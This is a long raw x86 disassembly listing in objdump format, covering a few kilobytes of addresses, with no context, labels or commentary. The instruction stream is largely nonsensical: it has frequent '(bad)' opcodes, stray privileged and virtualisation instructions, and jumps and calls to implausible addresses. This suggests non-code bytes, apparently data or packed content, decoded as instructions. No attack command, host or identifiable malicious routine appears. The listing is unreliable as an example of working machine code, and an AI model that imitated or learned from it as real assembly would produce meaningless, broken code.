  4286f0:	mov    DWORD PTR [eax],ecx
  4286f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286f3:	pop    es
  4286f4:	inc    ecx
  4286f5:	(bad)  
  4286f6:	cbw    
  4286f8:	inc    ebp
  4286f9:	xor    ah,BYTE PTR [esi+0x3]
  4286fc:	dec    ebp
  4286fd:	push   eax
  4286fe:	inc    bp
  428700:	jge    0x428685
  428702:	mov    esp,DWORD PTR [esi-0x18]
  428705:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  42870b:	add    DWORD PTR [ebx],esi
  42870d:	add    BYTE PTR [ebx],al
  42870f:	test   DWORD PTR [ebx],esi
  428711:	(bad)  
  428712:	inc    WORD PTR [ebp+0x0]
  428716:	mov    eax,DWORD PTR [eax]
  428718:	call   0x88983e4d
  42871d:	mov    esi,eax
  42871f:	clc    
  428720:	ret    
  428721:	rol    cl,0xa
  428724:	mov    DWORD PTR ds:0x7c0ec88,esi
  42872a:	mov    edx,edi
  42872c:	pushf  
  42872d:	pop    es
  42872e:	jmp    FWORD PTR [edx+0x66]
  428731:	add    BYTE PTR [ebp-0x990175],al
  428737:	inc    ebp
  428738:	test   DWORD PTR [ebx-0x2f000202],eax
  42873e:	push   ebp
  42873f:	mov    edi,eax
  428741:	mov    dh,BYTE PTR [eax+0x266ff51]
  428747:	push   ebp
  428748:	add    BYTE PTR [ebx-0x764b1777],al
  42874e:	dec    DWORD PTR [esi+0x661851e8]
  428754:	add    BYTE PTR [ebp-0x7b],dl
  428757:	cmp    esi,0xfffffffb
  42875a:	dec    DWORD PTR [ecx+0x51fe9285]
  428760:	jmp    DWORD PTR [esi-0x75]
  428763:	push   ebp
  428764:	hlt    
  428765:	data16 (bad) 
  428767:	dec    ebp
  428768:	ret    
  428769:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42876f:	lea    edx,[eax-0x1]
  428772:	jne    0x428745
  428774:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42877a:	dec    BYTE PTR [ecx+0x51559eff]
  428780:	mov    DWORD PTR [esi-0x4c],esp
  428783:	push   ebp
  428784:	jmp    DWORD PTR [esi-0x18]
  428787:	inc    ebp
  428788:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42878e:	(bad)  
  42878f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428790:	inc    eax
  428792:	test   DWORD PTR [esi-0x2],esp
  428795:	inc    ebp
  428796:	dec    DWORD PTR [ebp-0x760bde75]
  42879c:	(bad)  
  42879d:	test   al,0xc3
  42879f:	mov    DWORD PTR [ebp-0x769b56],ecx
  4287a5:	lods   al,BYTE PTR ds:[esi]
  4287a6:	push   eax
  4287a7:	inc    ebp
  4287a8:	jne    0x4287b9
  4287aa:	dec    DWORD PTR [ebp+0x8]
  4287ad:	mov    eax,DWORD PTR [edi]
  4287af:	sbb    al,0x0
  4287b1:	(bad)  
  4287b2:	mov    eax,0xc14fc3
  4287b7:	mov    DWORD PTR [eax-0x64],edi
  4287ba:	inc    bp
  4287bc:	test   DWORD PTR [edi],ecx
  4287be:	dec    DWORD PTR [ebp-0x1]
  4287c1:	xor    eax,edi
  4287c3:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4287c9:	inc    ebp
  4287ca:	xor    DWORD PTR [ebx],0x3f
  4287cd:	mov    WORD PTR [ebp-0x1bc],ax
  4287d4:	lea    ecx,[ecx-0x767702]
  4287da:	inc    esi
  4287db:	(bad)  
  4287dc:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4287e3:	pushf  
  4287e4:	rol    DWORD PTR [ebp-0x72019a],0xff
  4287eb:	add    bh,bh
  4287ed:	add    BYTE PTR [edi],cl
  4287ef:	test   DWORD PTR [eax],eax
  4287f1:	(bad)  
  4287f2:	dec    WORD PTR [ebp-0xff002d]
  4287f9:	mov    DWORD PTR [eax+edi*4+0x0],edi
  4287fd:	jmp    DWORD PTR [esi-0x73]
  428800:	lea    esi,[eax+0x50ffffff]
  428806:	fadd   QWORD PTR [ebp+0x0]
  428809:	xor    esp,DWORD PTR [esi+0x3]
  42880c:	lea    edx,[eax-0x1]
  42880f:	test   edi,edi
  428811:	dec    DWORD PTR [ebp-0x1]
  428814:	mov    edi,edi
  428816:	dec    eax
  428817:	clc    
  428818:	call   DWORD PTR [ebp-0x73]
  42881b:	lea    esi,[eax+0x51ffff88]
  428821:	lea    ecx,[ebp-0x78]
  428824:	test   WORD PTR [ebp-0x2],ax
  42882b:	popf   
  42882c:	push   eax
  42882d:	add    BYTE PTR [ecx-0x77],dl
  428830:	xor    edi,DWORD PTR [eax-0x7236007d]
  428836:	cwde   
  428837:	mov    al,0x32
  428839:	inc    DWORD PTR [ebx]
  42883b:	push   eax
  42883c:	push   ecx
  42883d:	inc    ebp
  42883e:	shl    BYTE PTR [ebx],1
  428840:	lea    eax,[ebx]
  428842:	call   DWORD PTR [eax-0x1]
  428845:	test   DWORD PTR [ebx],esi
  428847:	inc    DWORD PTR [eax-0x1]
  42884a:	(bad)  
  42884b:	(bad)  
  42884c:	(bad)  
  42884d:	clc    
  42884e:	call   DWORD PTR [ebp+0x50]
  428851:	jmp    0xcb89cb
  428856:	inc    esp
  428857:	jnp    0x428858
  428859:	add    BYTE PTR [ecx-0x484f73],cl
  42885f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428865:	mov    eax,DWORD PTR [ecx]
  428867:	data16 add BYTE PTR [ebp-0xb50077],al
  42886e:	inc    eax
  428870:	lea    esp,[esi+0x14]
  428873:	test   DWORD PTR [ecx-0xb301],ecx
  428879:	inc    edi
  42887a:	(bad)  
  42887b:	dec    si
  42887d:	test   edi,edi
  42887f:	(bad)  
  428880:	cmp    eax,0xc74f73ff
  428885:	mov    edx,DWORD PTR [edx-0x7d]
  428888:	push   DWORD PTR [ebx+0x56328939]
  42888e:	(bad)  
  42888f:	call   FWORD PTR [esi-0x47]
  428892:	inc    DWORD PTR ds:0x893c00ea
  428898:	(bad)  
  428899:	pop    eax
  42889a:	mov    ah,0xff
  42889c:	(bad)  
  42889d:	mov    ecx,0x5745
  4288a2:	dec    DWORD PTR [ecx-0xf7a501]
  4288a8:	(bad)  
  4288a9:	mov    ecx,0x456108
  4288ae:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4288b4:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4288ba:	inc    BYTE PTR gs:[eax]
  4288bd:	inc    DWORD PTR [ebp-0x73]
  4288c0:	cmp    dh,bh
  4288c2:	pushf  
  4288c3:	inc    edi
  4288c5:	mov    ebx,eax
  4288c7:	hlt    
  4288c8:	test   DWORD PTR [ecx-0xbab708],ecx
  4288ce:	cmp    al,0xbe
  4288d0:	pushf  
  4288d1:	or     bh,al
  4288d3:	pop    es
  4288d4:	lock into 
  4288d6:	test   eax,eax
  4288d8:	clc    
  4288d9:	mov    ebx,0x387245
  4288de:	lahf   
  4288df:	retf   
  4288e0:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  4288e6:	add    edi,edi
  4288e8:	add    BYTE PTR [ecx+0x45],dl
  4288eb:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  4288f2:	mov    edx,DWORD PTR [ecx-0x74]
  4288f5:	inc    DWORD PTR [eax]
  4288f7:	cld    
  4288f8:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4288fe:	add    BYTE PTR [ebp-0x1b0177],al
  428904:	jge    0x42894b
  428906:	test   DWORD PTR [ebx+0xff9875],ecx
  42890c:	sbb    BYTE PTR [esi+0x55],ah
  42890f:	xchg   ebp,eax
  428910:	call   0x428414
  428915:	push   edi
  428916:	inc    ebp
  428917:	mov    dx,WORD PTR [ebp-0xfc0075]
  42891e:	cmp    al,0x85
  428920:	ud0    eax,DWORD PTR [ebp-0x1]
  428924:	test   DWORD PTR [edi+0x74],ecx
  428927:	dec    edi
  428928:	inc    DWORD PTR [ebp-0xf70004]
  42892e:	dec    DWORD PTR [edi-0x75]
  428931:	dec    edi
  428932:	cld    
  428933:	test   DWORD PTR [eax+0xff01ff],eax
  428939:	icebp  
  42893a:	add    BYTE PTR [edi-0x3a],cl
  42893d:	test   ebx,eax
  42893f:	inc    BYTE PTR [ebp-0x1]
  428942:	jne    0x428944
  428944:	mov    eax,DWORD PTR [eax]
  428946:	cld    
  428947:	xor    BYTE PTR [ecx+0x500155],cl
  42894d:	push   ebp
  42894e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428954:	add    BYTE PTR [ebp+0x35e90f50],al
  42895a:	add    al,BYTE PTR [eax]
  42895c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428962:	add    ah,ch
  428964:	or     BYTE PTR [ebp+0x4501f845],dh
  42896a:	jmp    0xde8c67
  42896f:	(bad)  
  428970:	nop    ecx
  428973:	test   DWORD PTR [ebp+0x4502f8],eax
  428979:	cmp    cl,BYTE PTR [ebp-0x64]
  42897c:	mov    eax,edi
  42897e:	mov    ebx,DWORD PTR [eax+edx*2]
  428981:	add    eax,0x45fef885
  428986:	dec    DWORD PTR [ebx+0x339445]
  42898c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428992:	dec    DWORD PTR [ebx-0x460f0375]
  428998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428999:	add    esi,edi
  42899b:	add    bh,bh
  42899d:	rdpmc  
  42899f:	add    BYTE PTR [ebx],0x1
  4289a2:	mov    DWORD PTR [eax],eax
  4289a4:	add    al,0x45
  4289a6:	dec    DWORD PTR [ecx-0x360b3373]
  4289ac:	dec    DWORD PTR [esi]
  4289ae:	push   eax
  4289af:	jne    0x4289f6
  4289b1:	mov    esi,DWORD PTR [ebx]
  4289b3:	cld    
  4289b4:	add    ebp,ebx
  4289b6:	push   eax
  4289b7:	inc    DWORD PTR [ebp-0x75]
  4289ba:	add    eax,0x800e4
  4289bf:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4289c5:	mov    DWORD PTR [ecx],eax
  4289c7:	sbb    al,0x0
  4289c9:	leave  
  4289ca:	test   DWORD PTR [edi-0x2],eax
  4289cd:	jne    0x4289ce
  4289cf:	call   0xff4374d4
  4289d4:	xor    BYTE PTR [ebp+0x4d],al
  4289d7:	mov    edi,edi
  4289d9:	enter  0x8,0x4d
  4289dd:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4289e3:	mov    eax,DWORD PTR [eax]
  4289e5:	cld    
  4289e6:	add    DWORD PTR [ecx],ebx
  4289e8:	inc    ebp
  4289e9:	dec    ebp
  4289ea:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4289f0:	inc    eax
  4289f1:	dec    DWORD PTR [ecx-0x270375]
  4289f7:	add    BYTE PTR [ebx-0x39d72701],cl
  4289fd:	xchg   ecx,eax
  4289fe:	ret    
  4289ff:	add    BYTE PTR [ebp-0x830075],al
  428a05:	add    BYTE PTR [ebp-0x75],al
  428a08:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  428a0e:	lea    edi,[edi-0xc]
  428a11:	add    bh,bh
  428a13:	mov    edx,DWORD PTR [eax-0x7b]
  428a16:	inc    ebp
  428a17:	rdpmc  
  428a19:	jne    0x428a1e
  428a1b:	add    BYTE PTR [eax-0x75],dl
  428a1e:	inc    ebp
  428a1f:	clc    
  428a20:	add    eax,0x400009
  428a25:	mov    DWORD PTR [ebx-0x7f000304],ecx
  428a2b:	mov    eax,DWORD PTR [ecx]
  428a2d:	in     al,dx
  428a2e:	add    dh,al
  428a30:	test   ebx,eax
  428a32:	inc    BYTE PTR [ebp-0xff0001]
  428a38:	add    BYTE PTR [ebp-0x43],al
  428a3b:	cmp    esi,0xfffffff8
  428a3e:	(bad)  
  428a3f:	push   DWORD PTR [eax]
  428a41:	add    BYTE PTR [ebp-0x3a],dl
  428a44:	test   ebx,eax
  428a46:	je     0x4289cd
  428a48:	mov    edi,edi
  428a4a:	sbb    al,0xff
  428a4c:	test   DWORD PTR gs:[eax],eax
  428a4f:	(bad)  
  428a50:	js     0x428a51
  428a52:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428a58:	sub    eax,ebx
  428a5a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428a60:	add    eax,DWORD PTR [eax]
  428a62:	dec    ebp
  428a63:	push   eax
  428a64:	mov    al,BYTE PTR [ebp+0x1]
  428a67:	mov    eax,DWORD PTR [ebp-0x68]
  428a6a:	mov    eax,DWORD PTR [eax]
  428a6c:	sbb    bh,al
  428a6e:	or     ah,dh
  428a70:	dec    ebp
  428a71:	inc    DWORD PTR [eax+0x4]
  428a74:	push   ecx
  428a75:	add    BYTE PTR [edx-0x1],dh
  428a78:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  428a7e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428a88:	add    ecx,DWORD PTR [ecx-0x1be77477]
  428a8e:	push   ecx
  428a8f:	cmp    BYTE PTR [ebx],al
  428a91:	inc    ebp
  428a92:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428a98:	(bad)  
  428a99:	(bad)  
  428a9a:	in     al,0xff
  428a9c:	add    BYTE PTR [ebp+0x0],al
  428a9f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428aa5:	add    al,bh
  428aa7:	(bad)  
  428aa8:	jmp    0x8d85:0x74b0558d
  428aaf:	dec    DWORD PTR [eax]
  428ab1:	call   DWORD PTR [ebp-0x7b]
  428ab4:	mov    edi,esi
  428ab6:	lock call DWORD PTR [ebp-0x75]
  428aba:	mov    esi,esp
  428abc:	mov    ah,0xc6
  428abe:	mov    bh,0xc3
  428ac0:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428ac6:	add    DWORD PTR [eax],0x450050ff
  428acc:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428ad2:	inc    edi
  428ad4:	push   esp
  428ad6:	jmp    0xcd00:0x680481ff
  428add:	mov    DWORD PTR [ebx],esi
  428adf:	clc    
  428ae0:	cmp    edi,0xff9cff3b
  428ae6:	jne    0x428af0
  428ae8:	mov    eax,eax
  428aea:	add    esi,DWORD PTR [eax]
  428aec:	int3   
  428aed:	inc    ebp
  428aee:	cmp    al,0x83
  428af0:	add    BYTE PTR [eax],bl
  428af2:	adc    DWORD PTR [ebx+0x768b5055],eax
  428af8:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  428afe:	mov    edi,eax
  428b00:	cmp    BYTE PTR [ebp+0x45],cl
  428b03:	jmp    0x428a90
  428b05:	mov    ebx,DWORD PTR [esp+ebp*8]
  428b08:	inc    ebp
  428b09:	or     al,0x2
  428b0b:	dec    DWORD PTR [ebp+0x18]
  428b0e:	jne    0x428b65
  428b10:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  428b16:	mov    edi,DWORD PTR [ebx]
  428b18:	in     al,0x50
  428b1a:	xchg   ecx,eax
  428b1b:	jmp    0x342da20
  428b20:	adc    al,0x8b
  428b22:	inc    ebp
  428b23:	mov    al,ds:0x8b04008b
  428b28:	push   ebp
  428b29:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  428b2f:	push   ebp
  428b30:	test   DWORD PTR [ebx-0x2800d701],ecx
  428b36:	inc    ebp
  428b37:	dec    ebp
  428b38:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  428b3e:	mov    DWORD PTR [eax],0xe9ff00f4
  428b44:	add    al,0x0
  428b46:	add    BYTE PTR [eax],al
  428b48:	mov    eax,edx
  428b4a:	push   eax
  428b4b:	rol    DWORD PTR [ebp-0xf0177],1
  428b51:	bound  eax,QWORD PTR [ebp+0x50]
  428b54:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  428b5a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428b60:	mov    al,0xf
  428b62:	test   DWORD PTR [edx],edx
  428b64:	call   DWORD PTR [ebp-0x7a0001]
  428b6a:	(bad)  
  428b6b:	loop   0x428b6c
  428b6d:	jnp    0xc6987f73
  428b73:	mov    eax,ebx
  428b75:	cmp    al,0x8b
  428b77:	(bad)  
  428b78:	cld    
  428b79:	shr    esi,0xc
  428b7c:	add    dl,al
  428b7e:	push   eax
  428b7f:	lea    eax,[ebp-0x1]
  428b82:	mov    edx,esi
  428b84:	cwde   
  428b85:	cli    
  428b86:	add    BYTE PTR [ebp+0x1ffff8ff],al
  428b8c:	or     BYTE PTR [eax],cl
  428b8e:	inc    ebp
  428b8f:	dec    ebp
  428b90:	inc    DWORD PTR [ebx+0x74803914]
  428b96:	add    DWORD PTR [ebx+0x451800],ecx
  428b9c:	call   DWORD PTR [eax+edx*1]
  428b9f:	add    ecx,DWORD PTR [ebp-0x34]
  428ba2:	push   edi
  428ba3:	adc    al,0x8
  428ba5:	mov    edx,DWORD PTR [ebp-0x14]
  428ba8:	mov    ecx,DWORD PTR [ebp+0x18]
  428bab:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  428baf:	inc    DWORD PTR [eax+esi*8]
  428bb2:	inc    ebp
  428bb3:	stos   BYTE PTR es:[edi],al
  428bb4:	mov    edx,DWORD PTR [ebp-0x4]
  428bb7:	add    DWORD PTR [ebp-0x1c],eax
  428bba:	mov    edx,DWORD PTR [ebp-0x70]
  428bbd:	cmp    eax,DWORD PTR [eax]
  428bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428bc0:	mov    eax,DWORD PTR [eax]
  428bc2:	cld    
  428bc3:	jae    0x428b45
  428bc5:	add    eax,DWORD PTR [ecx]
  428bc7:	clc    
  428bc8:	add    BYTE PTR [eax+0x30],dl
  428bcb:	mov    DWORD PTR [ecx],esi
  428bcd:	clc    
  428bce:	pop    ds
  428bcf:	inc    ebp
  428bd0:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428bd6:	(bad)  
  428bd7:	push   DWORD PTR [edi]
  428bd9:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  428bdf:	(bad)  
  428be0:	jae    0x428be1
  428be2:	mov    eax,DWORD PTR [ebp-0x740175]
  428be8:	sub    eax,DWORD PTR [eax]
  428bea:	add    eax,DWORD PTR [eax]
  428bec:	mov    DWORD PTR [ecx+0x5f],eax
  428bef:	mov    DWORD PTR [ebx-0x4],ebx
  428bf2:	ret    0xff
  428bf5:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  428bfb:	ret    
  428bfc:	mov    eax,DWORD PTR [ebp-0x6f0075]
  428c02:	add    BYTE PTR [ebp-0x7d],al
  428c05:	mov    DWORD PTR [eax],eax
  428c07:	add    al,0x84
  428c09:	inc    DWORD PTR [ecx]
  428c0b:	lea    eax,[eax]
  428c0d:	hlt    
  428c0e:	sar    bh,cl
  428c10:	test   BYTE PTR [eax+0x1],dl
  428c13:	inc    ebp
  428c14:	add    BYTE PTR [ebx],dh
  428c16:	test   BYTE PTR [ebx],0x84
  428c19:	push   eax
  428c1a:	add    BYTE PTR [ebp+0x0],al
  428c1d:	add    eax,0x86
  428c22:	add    BYTE PTR [ebx-0x7f7b0340],cl
  428c28:	add    BYTE PTR [ecx],al
  428c2a:	add    BYTE PTR [eax],al
  428c2c:	mov    esi,0x550030
  428c31:	mov    ecx,DWORD PTR [edi]
  428c33:	cld    
  428c34:	fidiv  DWORD PTR [ebp+0x0]
  428c37:	mov    edi,DWORD PTR [ecx]
  428c39:	xor    BYTE PTR [eax+eax*1],0x84
  428c3d:	add    eax,DWORD PTR [eax]
  428c3f:	sbb    BYTE PTR [eax],al
  428c41:	jne    0x428bf4
  428c43:	mov    eax,DWORD PTR [ecx]
  428c45:	sbb    BYTE PTR [eax],al
  428c47:	mov    DWORD PTR [ebp-0x1],esp
  428c4a:	add    BYTE PTR [eax+0x30e45ca],bh
  428c50:	ret    0xb7fc
  428c53:	dec    ebp
  428c54:	or     al,0x89
  428c56:	dec    ebp
  428c57:	cld    
  428c58:	cmovne ecx,DWORD PTR [eax-0x75]
  428c5c:	add    edi,esp
  428c5e:	seto   BYTE PTR [esi-0x72ffffff]
  428c65:	inc    ebp
  428c66:	adc    al,0x8b
  428c68:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428c6f:	cmp    DWORD PTR [edi+0x72],edx
  428c72:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428c78:	gs cmp al,0x0
  428c7b:	je     0x428c53
  428c7d:	push   eax
  428c7e:	sar    BYTE PTR [eax],1
  428c80:	mov    bh,0x3e
  428c82:	push   cs
  428c83:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428c89:	add    DWORD PTR [ecx+0x12],ebp
  428c8c:	dec    edx
  428c8d:	(bad)  
  428c8e:	mov    eax,edx
  428c90:	in     al,dx
  428c91:	adc    DWORD PTR [ecx],esi
  428c93:	pop    esi
  428c94:	inc    ecx
  428c95:	leave  
  428c96:	or     DWORD PTR [eax],ebx
  428c98:	gs push ebp
  428c9a:	add    ah,ch
  428c9c:	into   
  428c9d:	in     al,dx
  428c9e:	enter  0xb756,0xf0
  428ca2:	push   cs
  428ca3:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428cad:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428cb3:	jnp    0x744311bb
  428cb9:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428cbf:	add    BYTE PTR [edi],cl
  428cc1:	mov    edi,DWORD PTR [ecx-0x78]
  428cc4:	ltr    WORD PTR [ecx-0x7b]
  428cc8:	dec    DWORD PTR [edi]
  428cca:	clc    
  428ccb:	out    0x45,eax
  428ccd:	add    BYTE PTR [eax],cl
  428ccf:	cmp    ebx,0xffffff8c
  428cd2:	jge    0x428cd4
  428cd4:	jb     0x428ce6
  428cd6:	je     0x518d56
  428cdc:	pop    edx
  428cdd:	push   esi
  428cde:	mov    ecx,DWORD PTR [edi]
  428ce0:	in     al,dx
  428ce1:	rol    DWORD PTR [ebp+0x0],1
  428ce4:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428ceb:	cmp    DWORD PTR [ecx],0xfffffff0
  428cee:	hlt    
  428cef:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428cf5:	(bad)  
  428cf7:	push   eax
  428cf8:	jns    0xb8427176
  428cfe:	lock push cs
  428d00:	ror    edx,0x3
  428d03:	test   BYTE PTR [ecx+0x5500e800],cl
  428d09:	dec    eax
  428d0a:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428d0e:	(bad)  
  428d0f:	mov    esi,0x7f33ff5f
  428d14:	inc    eax
  428d15:	test   DWORD PTR [edx],eax
  428d17:	je     0x428cd9
  428d19:	mov    ecx,ecx
  428d1b:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428d1f:	and    eax,DWORD PTR [eax+0xf0103]
  428d25:	jp     0x428d13
  428d27:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428d2b:	add    edx,DWORD PTR [edi+0x74]
  428d2e:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428d34:	add    BYTE PTR [ebp-0x74c48bbb],al
  428d3a:	je     0x428cbf
  428d3c:	cmp    eax,edi
  428d3e:	js     0x428d63
  428d40:	add    eax,0xeb0fc003
  428d45:	jns    0x428cd2
  428d47:	vmread DWORD PTR [ecx+0x45],ebx
  428d4b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428d51:	adc    al,0x8b
  428d53:	jge    0x428d69
  428d55:	mov    edi,DWORD PTR [eax-0x4]
  428d58:	add    edi,DWORD PTR [edi]
  428d5a:	or     bh,bh
  428d5c:	push   ebp
  428d5d:	push   es
  428d5e:	mov    DWORD PTR [ebp-0x4],ebx
  428d61:	add    edi,esi
  428d63:	pop    es
  428d64:	add    esi,DWORD PTR [edi-0x48ccf183]
  428d6a:	mov    DWORD PTR [esp+esi*8],ecx
  428d6d:	inc    ebp
  428d6e:	pop    ebp
  428d6f:	xor    DWORD PTR [esi-0x4],0x3b
  428d73:	add    edx,DWORD PTR [ecx+edi*1]
  428d76:	push   es
  428d77:	clc    
  428d78:	mov    bh,0xdb
  428d7a:	jp     0x428d33
  428d7c:	add    cl,BYTE PTR [esi]
  428d7e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428d84:	test   edi,edi
  428d86:	je     0x428d7c
  428d88:	mov    eax,ecx
  428d8a:	or     BYTE PTR [ebx],al
  428d8c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428d92:	jbe    0x428e06
  428d94:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428d9a:	add    ecx,DWORD PTR [esi]
  428d9c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428da2:	add    eax,DWORD PTR [ebx-0x287af783]
  428da8:	je     0x428df7
  428daa:	mov    DWORD PTR [ecx],edi
  428dac:	mov    esi,eax
  428dae:	hlt    
  428daf:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428db6:	jb     0x428d78
  428db8:	jmp    0x428da5
  428dba:	xor    esi,DWORD PTR [ebx]
  428dbc:	pop    edi
  428dbd:	pop    esi
  428dbe:	pop    ebx
  428dbf:	ret    
  428dc0:	ret    0x8b
  428dc3:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428dc9:	cmp    DWORD PTR [eax],0xc
  428dcc:	pushf  
  428dcd:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428dd3:	(bad)  
  428dd5:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428ddc:	dec    ebp
  428ddd:	ret    
  428dde:	mov    edi,DWORD PTR [esi-0x4]
  428de1:	pop    eax
  428de2:	dec    ebp
  428de3:	jne    0x428d70
  428de5:	xor    edi,esp
  428de7:	inc    eax
  428de8:	dec    ebp
  428de9:	jbe    0x428e3e
  428deb:	inc    eax
  428dec:	pop    ebp
  428ded:	add    edx,DWORD PTR [esi+0x8]
  428df0:	push   eax
  428df1:	dec    eax
  428df2:	push   ecx
  428df3:	mov    eax,edi
  428df5:	and    al,0xf0
  428df7:	jo     0x428de4
  428df9:	mov    eax,DWORD PTR [ebx]
  428dfb:	sbb    BYTE PTR [ebp+0x4d],cl
  428dfe:	mov    eax,DWORD PTR [ebx]
  428e00:	nop
  428e01:	or     BYTE PTR [eax],al
  428e03:	jne    0x428e5c
  428e05:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428e0b:	cld    
  428e0c:	xor    edi,edi
  428e0e:	add    edi,DWORD PTR [ebp+0x3]
  428e11:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428e17:	js     0x428d9d
  428e19:	jae    0x428e1d
  428e1b:	(bad)  
  428e1d:	xor    al,0x5d
  428e1f:	jmp    0x428dac
  428e21:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428e28:	fdecstp 
  428e2a:	test   BYTE PTR [edi],ah
  428e2c:	add    bh,BYTE PTR [ebp+0x0]
  428e2f:	add    ebx,DWORD PTR [ebp-0x77]
  428e32:	mov    edi,eax
  428e34:	cmp    al,0x0
  428e37:	adc    dh,BYTE PTR [ebx]
  428e39:	jge    0x428e3e
  428e3b:	mov    edi,DWORD PTR [ebx]
  428e3d:	jl     0x428e4e
  428e3f:	clc    
  428e40:	dec    edi
  428e41:	jge    0x428e43
  428e43:	mov    eax,DWORD PTR [ebx]
  428e45:	jb     0x428e4f
  428e47:	mov    ecx,DWORD PTR [ebp-0x8]
  428e4a:	mov    edi,edi
  428e4c:	xor    edx,DWORD PTR [eax]
  428e4e:	add    edi,DWORD PTR [ebx]
  428e50:	mov    DWORD PTR [ebp-0x10],edi
  428e53:	inc    edi
  428e54:	pop    ebp
  428e55:	jge    0x428e92
  428e57:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428e5b:	mov    edx,0xc05d87f0
  428e60:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428e64:	fimul  WORD PTR [eax]
  428e66:	fist   WORD PTR [ebp+0x1c]
  428e69:	in     al,dx
  428e6a:	jne    0x428e58
  428e6c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428e72:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428e76:	fdivp  st(0),st
  428e78:	fild   WORD PTR [ebp+0x4510f85c]
  428e7e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428e84:	inc    ebp
  428e85:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428e8b:	mov    ebp,DWORD PTR [ebx-0x4]
  428e8e:	adc    al,0x8b
  428e90:	rcl    DWORD PTR [eax],0x48
  428e93:	mov    esi,0x7080803
  428e98:	fiadd  WORD PTR [ebp+0x4d]
  428e9b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428ea1:	cld    
  428ea2:	xor    ebx,DWORD PTR [ebx+0x330103]
  428ea8:	mov    DWORD PTR [edi+0x872dc],edi
  428eae:	xlat   BYTE PTR ds:[ebx]
  428eaf:	into   
  428eb0:	ffreep st(6)
  428eb2:	retf   0x6c7
  428eb5:	iret   
  428eb6:	dec    ebp
  428eb7:	inc    ebp
  428eb8:	mov    DWORD PTR [ebx],edi
  428eba:	fmul   QWORD PTR [edi]
  428ebc:	dec    ebp
  428ebd:	jnp    0x428ef2
  428ebf:	add    BYTE PTR [ebx],al
  428ec1:	mov    ecx,DWORD PTR [esp+edi*8]
  428ec4:	inc    ebp
  428ec5:	dec    ebp
  428ec6:	lea    esi,[ebx]
  428ec8:	add    DWORD PTR [ebx],eax
  428eca:	jb     0x428f07
  428ecc:	add    BYTE PTR [edi],cl
  428ece:	inc    ebp
  428ecf:	imul   eax,edi,0x858bd800
  428ed5:	cld    
  428ed6:	clc    
  428ed7:	mov    DWORD PTR [ebp+0x0],eax
  428eda:	inc    DWORD PTR [eax]
  428edc:	or     al,0xde
  428ede:	sbb    bh,0x1
  428ee1:	retf   
  428ee2:	add    BYTE PTR [eax+edx*1+0x33004d02],al
